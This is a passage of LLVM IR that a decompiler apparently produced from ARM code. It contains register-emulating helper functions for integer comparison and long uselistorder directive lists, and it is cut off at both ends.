  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 87, 13, 14, 15, 86, 92, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 85, 90, 54, 55, 56, 93, 57, 94, 58, 95, 59, 96, 91, 97, 60, 61, 63, 62, 64, 65, 66, 67, 0, 88, 1, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 84, 89, 83, 80, 81, 82 }
  uselistorder i32 1048576, { 16, 0, 1, 2, 17, 18, 11, 3, 4, 5, 19, 6, 7, 20, 21, 13, 14, 8, 9, 22, 23, 24, 15, 25, 10, 26, 12, 27 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 5, 88, 89, 90, 91, 107, 108, 109, 110, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 6, 138, 139, 149, 150, 151, 152, 164, 165, 166, 178, 179, 180, 181, 8, 7, 26, 27, 28, 29, 30, 31, 182, 183, 9, 184, 185, 186, 187, 188, 189, 190, 125, 126, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 111, 112, 113, 114, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 92, 10, 93, 94, 11, 167, 168, 169, 12, 170, 171, 205, 266, 267, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 0, 219, 220, 221, 222, 223, 224, 225, 226, 227, 13, 228, 229, 230, 231, 232, 233, 234, 172, 173, 14, 174, 175, 176, 177, 140, 141, 142, 143, 144, 145, 146, 147, 148, 95, 96, 97, 98, 15, 16, 99, 100, 101, 102, 103, 104, 105, 106, 32, 33, 34, 35, 36, 37, 38, 17, 18, 19, 309, 310, 311, 312, 313, 314, 315, 39, 20, 40, 21, 41, 306, 307, 308, 42, 43, 44, 70, 71, 72, 73, 45, 46, 47, 48, 49, 50, 269, 273, 274, 275, 276, 270, 271, 272, 277, 278, 279, 280, 281, 22, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 297, 299, 293, 294, 295, 296, 298, 300, 67, 68, 4, 69, 51, 52, 301, 302, 303, 304, 305, 268, 2, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 23, 25, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 3, 264, 265, 24, 53, 249, 1, 250, 251, 54, 55, 63, 64, 65, 66, 56, 57, 58, 59, 60, 61, 62, 74, 75, 76 }
  uselistorder i32* @r5, { 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 33, 34, 35, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 182, 188, 189, 190, 191, 194, 195, 196, 197, 198, 199, 200, 201, 0, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 26, 224, 225, 226, 227, 25, 228, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 7, 295, 294, 27, 296, 297, 298, 299, 300, 36, 37, 38, 39, 40, 301, 302, 303, 304, 305, 306, 311, 312, 307, 308, 309, 310, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 8, 323, 324, 42, 43, 44, 45, 46, 47, 48, 49, 50, 192, 193, 229, 230, 231, 9, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 183, 184, 185, 10, 186, 187, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 263, 264, 265, 266, 440, 441, 442, 160, 30, 161, 4, 162, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 245, 246, 247, 248, 249, 253, 254, 255, 256, 257, 250, 251, 28, 252, 258, 259, 260, 261, 262, 163, 164, 165, 166, 1, 11, 398, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 2, 354, 355, 356, 357, 358, 359, 267, 268, 273, 274, 275, 276, 12, 277, 278, 217, 218, 219, 220, 221, 13, 222, 223, 167, 16, 168, 169, 14, 170, 171, 172, 173, 174, 175, 15, 176, 177, 178, 179, 180, 181, 51, 17, 52, 53, 54, 55, 31, 41, 18, 56, 57, 58, 59, 60, 455, 19, 456, 457, 466, 61, 62, 63, 64, 65, 66, 67, 458, 459, 460, 461, 462, 68, 69, 70, 71, 72, 73, 74, 75, 76, 114, 115, 116, 77, 78, 79, 80, 81, 463, 464, 465, 82, 83, 84, 85, 405, 406, 410, 411, 412, 413, 414, 407, 408, 409, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 6, 428, 429, 430, 431, 432, 20, 433, 434, 435, 436, 105, 106, 107, 108, 109, 399, 400, 401, 402, 437, 438, 21, 439, 403, 404, 269, 22, 270, 271, 272, 360, 23, 361, 32, 362, 363, 364, 365, 366, 367, 368, 369, 371, 370, 372, 373, 24, 374, 375, 376, 377, 378, 379, 380, 29, 381, 382, 386, 5, 387, 3, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 86, 87, 88, 383, 384, 385, 89, 90, 99, 100, 101, 102, 103, 104, 91, 92, 93, 94, 95, 96, 97, 98, 110, 111, 112, 113, 117, 118, 119 }
  uselistorder i32 %arg4, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 7, 6, 4, 9, 8, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_1dcb0, { 1, 0 }
  uselistorder label %dec_label_pc_1dc94, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_1dc60, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_1db50, { 1, 0 }
  uselistorder label %dec_label_pc_1db38, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_1dce0() local_unnamed_addr {
dec_label_pc_1dce0:
  store i32 1, i32* @ip, align 4
  %v0_1dce0 = load i32, i32* @r0, align 4
  ret i32 %v0_1dce0
}

define i32 @function_1dce4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1dce4:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_1dce4 = load i32, i32* @ip, align 4
  %v0_1dce8 = load i32, i32* @r1, align 4
  %v2_1dce8 = mul i32 %v0_1dce8, 2
  %v2_1dce8.off = add i32 %v2_1dce8, 4194303
  %tmp = icmp ult i32 %v2_1dce8.off, 2097152
  %v0_1dcf0 = load i32, i32* @r3, align 4
  %v2_1dcf0 = mul i32 %v0_1dcf0, 2
  br i1 %tmp, label %dec_label_pc_1dd40, label %bb

bb:                                               ; preds = %dec_label_pc_1dce4
  %v2_1dcf0.off = add i32 %v2_1dcf0, 4194303
  %tmp21 = icmp ult i32 %v2_1dcf0.off, 2097152
  br i1 %tmp21, label %dec_label_pc_1dd34, label %dec_label_pc_1dcfc

dec_label_pc_1dcfc:                               ; preds = %dec_label_pc_1dd48, %dec_label_pc_1dd54, %bb
  %v0_1dcfc = load i32, i32* %r0.global-to-local, align 4
  %v4_1dcfc = or i32 %v0_1dcfc, %v2_1dce8
  store i32 %v4_1dcfc, i32* @ip, align 4
  %v6_1dcfc = icmp eq i32 %v4_1dcfc, 0
  br i1 %v6_1dcfc, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_1dcfc
  %v1_1dd00 = load i32, i32* @r2, align 4
  %v5_1dd00 = or i32 %v1_1dd00, %v2_1dcf0
  store i32 %v5_1dd00, i32* @ip, align 4
  %v7_1dd00 = icmp eq i32 %v5_1dd00, 0
  br i1 %v7_1dd00, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_1dcfc, %bb10
  %v5_1dd04 = icmp eq i32 %v0_1dcf0, %v0_1dce8
  br i1 %v5_1dd04, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_1dd08.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_1dd08 = phi i32 [ %v2_1dd08.pre, %.thread..thread1_crit_edge ], [ %v1_1dd00, %bb10 ]
  %v5_1dd08 = icmp eq i32 %v2_1dd08, %v0_1dcfc
  br i1 %v5_1dd08, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_1dd10 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_1dd10 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1dd10, i32 %v0_1dd10)
  %v0_1dd14 = load i32, i32* %r0.global-to-local, align 4
  %v0_1dd18 = load i32, i32* @r1, align 4
  %v1_1dd18 = load i32, i32* @r3, align 4
  %v2_1dd18 = xor i32 %v1_1dd18, %v0_1dd18
  %v3_1dd18 = icmp slt i32 %v2_1dd18, 0
  br i1 %v3_1dd18, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_1dd1c = icmp eq i32 %v0_1dd18, %v1_1dd18
  br i1 %v10_1dd1c, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_1dd20 = load i32, i32* @r2, align 4
  %v4_1dd20 = icmp ult i32 %v0_1dd14, %v2_1dd20
  br i1 %v4_1dd20, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_1dd1c = icmp ult i32 %v0_1dd18, %v1_1dd18
  br i1 %v4_1dd1c, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_1dd18, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_1dd24 = and i32 %v1_1dd18, 1073741824
  %v3_1dd24 = icmp eq i32 %v2_1dd24, 0
  %v4_1dd24 = ashr i32 %v1_1dd18, 31
  br i1 %v3_1dd24, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_1dd28.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_1dd24, %bb15 ]
  %v5_1dd28 = sub nsw i32 -1, %v4_1dd28.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_1dd2c = phi i32 [ %v5_1dd28, %.thread3 ], [ %v4_1dd24, %bb15 ]
  %v1_1dd2c = or i32 %v0_1dd2c, 1
  store i32 %v1_1dd2c, i32* %r0.global-to-local, align 4
  ret i32 %v1_1dd2c

dec_label_pc_1dd34:                               ; preds = %bb
  br label %dec_label_pc_1dd48

dec_label_pc_1dd40:                               ; preds = %dec_label_pc_1dce4
  %v0_1dd40 = load i32, i32* %r0.global-to-local, align 4
  %v4_1dd40 = mul i32 %v0_1dce8, 4096
  %v5_1dd40 = or i32 %v0_1dd40, %v4_1dd40
  store i32 %v5_1dd40, i32* @ip, align 4
  %v7_1dd40 = icmp eq i32 %v5_1dd40, 0
  br i1 %v7_1dd40, label %dec_label_pc_1dd40.dec_label_pc_1dd48_crit_edge, label %dec_label_pc_1dd5c

dec_label_pc_1dd40.dec_label_pc_1dd48_crit_edge:  ; preds = %dec_label_pc_1dd40
  %v2_1dcf0.off20 = add i32 %v2_1dcf0, 4194303
  %tmp22 = icmp ult i32 %v2_1dcf0.off20, 2097152
  br label %dec_label_pc_1dd48

dec_label_pc_1dd48:                               ; preds = %dec_label_pc_1dd40.dec_label_pc_1dd48_crit_edge, %dec_label_pc_1dd34
  %v3_1dd4c.pre-phi = phi i1 [ %tmp22, %dec_label_pc_1dd40.dec_label_pc_1dd48_crit_edge ], [ true, %dec_label_pc_1dd34 ]
  br i1 %v3_1dd4c.pre-phi, label %dec_label_pc_1dd54, label %dec_label_pc_1dcfc

dec_label_pc_1dd54:                               ; preds = %dec_label_pc_1dd48
  %v0_1dd54 = load i32, i32* @r2, align 4
  %v4_1dd54 = mul i32 %v0_1dcf0, 4096
  %v5_1dd54 = or i32 %v0_1dd54, %v4_1dd54
  store i32 %v5_1dd54, i32* @ip, align 4
  %v7_1dd54 = icmp eq i32 %v5_1dd54, 0
  br i1 %v7_1dd54, label %dec_label_pc_1dcfc, label %dec_label_pc_1dd5c

dec_label_pc_1dd5c:                               ; preds = %dec_label_pc_1dd40, %dec_label_pc_1dd54
  store i32 %v0_1dce4, i32* %r0.global-to-local, align 4
  ret i32 %v0_1dce4

; uselistorder directives
  uselistorder i32 %v1_1dd18, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_1dd18, { 2, 1, 0 }
  uselistorder i32 %v1_1dd00, { 1, 0 }
  uselistorder i32 %v2_1dcf0, { 0, 2, 1 }
  uselistorder i32 %v0_1dcf0, { 1, 0, 2 }
  uselistorder i32 %v2_1dce8, { 1, 0 }
  uselistorder i32 %v0_1dce8, { 1, 0, 2 }
  uselistorder i32 %v0_1dce4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder i32 1073741824, { 4, 5, 3, 6, 0, 1, 2 }
  uselistorder i32 31, { 11, 4, 2, 5, 6, 12, 3, 13, 14, 7, 8, 1, 15, 0, 16, 17, 18, 19, 9, 10 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 1, 2, 3, 4, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 38, 39, 40, 47, 48, 49, 8, 58, 45, 44, 46, 50, 51, 41, 42, 43, 35, 63, 68, 66, 67, 65, 59, 60, 5, 10, 11, 61, 62, 64, 54, 55, 53, 6, 52, 7, 57, 56, 9 }
  uselistorder i32* @r3, { 40, 41, 10, 42, 43, 44, 12, 13, 45, 46, 9, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 59, 60, 61, 62, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 88, 3, 87, 8, 15, 58, 16, 17, 65, 89, 90, 121, 122, 5, 123, 124, 125, 6, 126, 127, 128, 7, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 0, 147, 148, 149, 150, 4, 91, 92, 93, 105, 106, 110, 94, 95, 70, 72, 73, 74, 75, 96, 97, 98, 99, 14, 151, 158, 159, 160, 156, 63, 64, 103, 104, 111, 66, 100, 116, 117, 118, 119, 120, 113, 114, 18, 19, 20, 164, 161, 162, 163, 2, 165, 166, 167, 101, 102, 71, 21, 25, 26, 157, 67, 68, 69, 152, 153, 154, 155, 107, 108, 109, 1, 22, 23, 24, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 11, 112, 115, 27 }
  uselistorder i32* @r1, { 79, 80, 13, 81, 82, 83, 84, 85, 86, 14, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 26, 27, 28, 29, 30, 98, 1, 99, 100, 101, 102, 103, 104, 105, 11, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 31, 21, 117, 118, 119, 120, 124, 12, 24, 125, 126, 127, 128, 129, 130, 134, 135, 136, 137, 138, 141, 149, 150, 151, 152, 153, 154, 155, 8, 32, 33, 35, 34, 156, 157, 142, 158, 37, 38, 139, 140, 2, 122, 159, 160, 166, 167, 121, 59, 143, 191, 168, 169, 170, 198, 199, 200, 201, 204, 171, 172, 173, 174, 175, 176, 190, 177, 178, 148, 192, 19, 123, 0, 36, 39, 17, 40, 214, 131, 132, 133, 76, 3, 196, 4, 212, 68, 16, 193, 194, 41, 208, 5, 205, 206, 207, 144, 145, 146, 179, 180, 181, 15, 23, 161, 162, 163, 164, 165, 6, 209, 210, 9, 69, 70, 25, 7, 182, 183, 184, 185, 186, 10, 187, 188, 189, 18, 147, 66, 67, 20, 22, 202, 203, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 60, 61, 62, 63, 64, 65, 71, 72, 73, 74, 75, 77, 78, 195, 211, 213, 197 }
  uselistorder i32* @ip, { 22, 23, 24, 25, 26, 27, 15, 16, 28, 29, 30, 31, 32, 33, 17, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 52, 53, 55, 56, 57, 58, 59, 60, 61, 62, 70, 1, 78, 77, 87, 88, 89, 90, 91, 92, 93, 94, 95, 97, 98, 96, 99, 9, 100, 10, 101, 102, 103, 104, 105, 106, 2, 107, 18, 71, 72, 73, 74, 75, 76, 54, 108, 109, 110, 124, 49, 50, 14, 126, 125, 5, 127, 128, 6, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 11, 197, 198, 199, 200, 201, 202, 203, 204, 205, 79, 80, 3, 81, 51, 0, 154, 129, 153, 82, 83, 86, 130, 131, 132, 206, 207, 20, 63, 64, 4, 65, 66, 67, 68, 69, 160, 12, 161, 162, 155, 156, 13, 157, 84, 85, 133, 163, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 135, 134, 7, 211, 208, 209, 210, 8, 212, 137, 138, 139, 140, 141, 142, 143, 144, 136, 145, 146, 147, 148, 149, 150, 151, 152, 19, 158, 159, 21 }
  uselistorder label %dec_label_pc_1dd5c, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1dcfc, { 1, 0, 2 }
}

define i32 @function_1dd64() local_unnamed_addr {
dec_label_pc_1dd64:
  %v0_1dd68 = load i32, i32* @r2, align 4
  store i32 %v0_1dd68, i32* @r0, align 4
  %v0_1dd7c = call i32 @function_1dd80()
  ret i32 %v0_1dd7c

; uselistorder directives
  uselistorder i32* @r2, { 50, 51, 52, 4, 53, 15, 54, 55, 56, 57, 58, 59, 11, 60, 61, 62, 63, 64, 65, 66, 70, 13, 72, 73, 74, 75, 76, 81, 92, 93, 94, 95, 96, 97, 17, 98, 99, 100, 101, 102, 18, 71, 132, 79, 80, 5, 69, 103, 104, 105, 14, 31, 10, 164, 165, 166, 126, 106, 107, 108, 158, 109, 110, 111, 112, 83, 84, 86, 87, 88, 90, 127, 91, 16, 67, 68, 167, 171, 172, 173, 174, 3, 186, 77, 78, 168, 133, 136, 137, 138, 6, 139, 140, 141, 7, 134, 135, 142, 8, 143, 159, 85, 113, 114, 115, 116, 32, 29, 82, 175, 182, 183, 176, 177, 178, 179, 180, 181, 0, 1, 184, 9, 185, 117, 118, 119, 121, 120, 122, 123, 124, 125, 89, 34, 35, 169, 170, 147, 148, 149, 150, 2, 151, 152, 153, 154, 155, 156, 157, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 33, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 128, 129, 130, 161, 12, 162, 163, 131, 144, 145, 146, 160, 36 }
}

define i32 @function_1dd80() local_unnamed_addr {
dec_label_pc_1dd80:
  %stack_var_-8 = alloca i32, align 4
  %v3_1dd80 = load i32, i32* @r0, align 4
  store i32 %v3_1dd80, i32* %stack_var_-8, align 4
  %v0_1dd84 = call i32 @function_1dce0()
  store i1 true, i1* @cpsr_c, align 1
  %v1_1dd88 = icmp slt i32 %v0_1dd84, 0
  %v2_1dd88 = icmp eq i32 %v0_1dd84, 0
  store i1 %v2_1dd88, i1* @cpsr_z, align 1
  br i1 %v1_1dd88, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_1dd80
  store i1 false, i1* @cpsr_c, align 1
  store i1 false, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1dd80, %bb
  %v2_1dd90 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v2_1dd90

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_1dd98(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1dd98:
  %v0_1dd9c = call i32 @function_1dd80()
  %v0_1dda0 = load i1, i1* @cpsr_z, align 1
  %.v0_1dd9c. = zext i1 %v0_1dda0 to i32
  ret i32 %.v0_1dd9c.
}

define i32 @function_1ddb0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1ddb0:
  %v0_1ddb4 = call i32 @function_1dd80()
  %v0_1ddb8 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1ddb8 to i32
  %.v0_1ddb4. = xor i32 %tmp2, 1
  ret i32 %.v0_1ddb4.
}

define i32 @function_1ddc8() local_unnamed_addr {
dec_label_pc_1ddc8:
  %v0_1ddcc = call i32 @function_1dd80()
  %v0_1ddd0 = load i1, i1* @cpsr_z, align 1
  %v1_1ddd0 = load i1, i1* @cpsr_c, align 1
  %v2_1ddd0 = xor i1 %v1_1ddd0, true
  %v3_1ddd0 = or i1 %v0_1ddd0, %v2_1ddd0
  %.v0_1ddcc = select i1 %v3_1ddd0, i32 1, i32 %v0_1ddcc
  %v2_1ddd4 = xor i1 %v0_1ddd0, true
  %v3_1ddd4 = and i1 %v1_1ddd0, %v2_1ddd4
  %..v0_1ddcc = select i1 %v3_1ddd4, i32 0, i32 %.v0_1ddcc
  ret i32 %..v0_1ddcc

; uselistorder directives
  uselistorder i1 %v1_1ddd0, { 1, 0 }
  uselistorder i32 ()* @function_1dd80, { 2, 1, 0, 3 }
}

define i32 @function_1dde0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1dde0:
  %stack_var_-8 = alloca i32, align 4
  %v0_1dde0 = load i32, i32* @lr, align 4
  store i32 %v0_1dde0, i32* %stack_var_-8, align 4
  %v0_1dde4 = call i32 @function_1dd64()
  %v0_1dde8 = load i1, i1* @cpsr_z, align 1
  %v1_1dde8 = load i1, i1* @cpsr_c, align 1
  %v2_1dde8 = xor i1 %v1_1dde8, true
  %v3_1dde8 = or i1 %v0_1dde8, %v2_1dde8
  %.v0_1dde4 = select i1 %v3_1dde8, i32 1, i32 %v0_1dde4
  %v2_1ddec = xor i1 %v0_1dde8, true
  %v3_1ddec = and i1 %v1_1dde8, %v2_1ddec
  %..v0_1dde4 = select i1 %v3_1ddec, i32 0, i32 %.v0_1dde4
  %v2_1ddf0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1ddf0, i32* @lr, align 4
  ret i32 %..v0_1dde4

; uselistorder directives
  uselistorder i1 %v1_1dde8, { 1, 0 }
  uselistorder i1 true, { 1, 2, 3, 4, 100, 0, 90, 5, 6, 7, 8, 9, 10, 82, 83, 91, 92, 84, 11, 12, 13, 85, 86, 87, 93, 14, 15, 16, 17, 19, 18, 101, 102, 103, 104, 105, 106, 107, 88, 108, 109, 110, 95, 111, 112, 113, 114, 89, 115, 116, 117, 118, 119, 120, 121, 20, 122, 99, 123, 21, 22, 23, 24, 25, 26, 27, 94, 124, 28, 29, 30, 31, 96, 34, 35, 36, 37, 32, 33, 97, 38, 39, 40, 41, 98, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 80, 70, 71, 72, 73, 81, 74, 75, 76, 77, 78, 79 }
  uselistorder i1* @cpsr_z, { 34, 0, 35, 36, 37, 38, 39, 40, 41, 42, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 50, 19, 20, 21, 22, 23, 24, 25, 26, 43, 44, 45, 46, 27, 28, 29, 47, 30, 31, 32, 33, 48, 49 }
  uselistorder i32* @lr, { 28, 29, 30, 31, 32, 33, 34, 35, 5, 6, 7, 8, 36, 0, 37, 1, 38, 39, 40, 41, 42, 43, 44, 45, 47, 48, 52, 53, 54, 58, 59, 60, 62, 63, 64, 65, 66, 70, 4, 74, 80, 81, 82, 83, 84, 85, 86, 87, 9, 10, 88, 89, 90, 98, 91, 92, 93, 94, 95, 96, 97, 99, 61, 11, 12, 71, 72, 73, 55, 56, 57, 19, 146, 147, 148, 149, 150, 151, 152, 153, 154, 75, 76, 77, 78, 79, 49, 50, 51, 120, 102, 103, 104, 105, 106, 107, 108, 109, 110, 67, 68, 111, 112, 46, 13, 14, 121, 122, 123, 20, 21, 69, 24, 25, 26, 15, 16, 27, 155, 156, 17, 18, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 2, 137, 138, 140, 141, 139, 100, 101, 113, 114, 115, 3, 116, 117, 118, 119, 145, 142, 143, 144, 22, 23 }
}

define i32 @function_1ddf8() local_unnamed_addr {
dec_label_pc_1ddf8:
  %v0_1ddfc = call i32 @function_1dd64()
  %v0_1de00 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1de00 to i32
  %.v0_1ddfc. = xor i32 %tmp2, 1
  ret i32 %.v0_1ddfc.

; uselistorder directives
  uselistorder i32 1, { 539, 555, 656, 556, 540, 657, 1035, 319, 1036, 955, 1037, 658, 168, 172, 171, 175, 169, 170, 174, 173, 1038, 659, 1039, 660, 21, 22, 19, 20, 424, 425, 426, 508, 162, 661, 431, 432, 1040, 1041, 28, 27, 1042, 363, 364, 365, 662, 422, 423, 1043, 463, 1044, 1045, 566, 1046, 1047, 663, 36, 37, 38, 32, 33, 35, 34, 1048, 1049, 664, 226, 225, 1050, 567, 568, 1051, 1065, 667, 666, 665, 377, 379, 376, 378, 1067, 668, 17, 18, 1068, 509, 1069, 1070, 669, 15, 16, 1071, 670, 159, 206, 205, 127, 1072, 672, 671, 202, 201, 200, 673, 114, 569, 1073, 1074, 1075, 480, 1076, 547, 510, 1077, 1078, 483, 1079, 1080, 676, 675, 674, 433, 435, 436, 434, 1081, 1082, 1083, 1092, 1093, 1094, 1101, 570, 571, 652, 683, 682, 653, 681, 680, 679, 678, 677, 380, 381, 382, 383, 1104, 684, 304, 301, 303, 302, 541, 1125, 1126, 534, 1127, 1129, 464, 1130, 573, 530, 529, 572, 1131, 475, 492, 527, 548, 1132, 1133, 1134, 1135, 1136, 0, 1137, 1128, 574, 1138, 536, 692, 644, 691, 690, 689, 688, 687, 686, 685, 336, 338, 335, 337, 1139, 1140, 1141, 1142, 1143, 465, 1144, 693, 135, 138, 134, 132, 131, 133, 136, 137, 956, 957, 958, 959, 960, 961, 962, 963, 511, 964, 965, 697, 696, 695, 694, 139, 140, 141, 142, 966, 967, 968, 969, 970, 700, 699, 698, 263, 259, 260, 265, 262, 261, 267, 266, 264, 512, 1145, 513, 1146, 1147, 1148, 1149, 1, 1150, 1151, 1152, 1153, 1154, 1155, 654, 701, 307, 306, 309, 310, 305, 311, 308, 557, 1156, 1157, 1158, 1159, 1160, 702, 164, 163, 165, 166, 167, 1105, 703, 393, 394, 395, 704, 186, 705, 23, 24, 25, 26, 706, 30, 29, 31, 1161, 1162, 1163, 707, 418, 420, 419, 416, 417, 708, 91, 92, 89, 95, 93, 90, 94, 190, 709, 367, 372, 366, 371, 375, 374, 370, 373, 368, 369, 258, 257, 1095, 575, 1096, 1097, 1098, 1099, 1100, 710, 97, 98, 96, 99, 189, 188, 514, 1164, 1165, 1184, 1185, 712, 711, 62, 64, 65, 63, 484, 535, 485, 1332, 1333, 1334, 1335, 515, 713, 61, 1002, 1003, 73, 74, 493, 1052, 1345, 1053, 1054, 1055, 494, 1004, 1057, 1056, 471, 714, 1005, 715, 428, 429, 430, 427, 1186, 495, 1187, 1347, 496, 1348, 1349, 1350, 1351, 1352, 1353, 953, 1354, 1355, 1356, 1357, 1358, 1359, 954, 645, 717, 716, 237, 241, 243, 239, 238, 240, 242, 244, 246, 245, 1115, 1106, 1113, 1114, 531, 497, 212, 210, 211, 214, 213, 576, 1107, 1108, 1111, 1112, 718, 646, 209, 208, 1110, 719, 247, 249, 250, 251, 248, 577, 1109, 721, 720, 354, 352, 355, 351, 353, 356, 1116, 722, 233, 232, 231, 1058, 1059, 723, 194, 193, 1243, 724, 396, 498, 516, 1188, 1189, 1190, 578, 1191, 481, 517, 476, 499, 1192, 579, 1193, 1194, 1195, 2, 1196, 469, 1197, 466, 1198, 580, 1199, 1200, 1201, 518, 1202, 737, 736, 735, 734, 733, 732, 731, 730, 729, 728, 727, 726, 647, 725, 451, 460, 450, 452, 453, 448, 449, 455, 454, 461, 462, 457, 456, 458, 459, 1304, 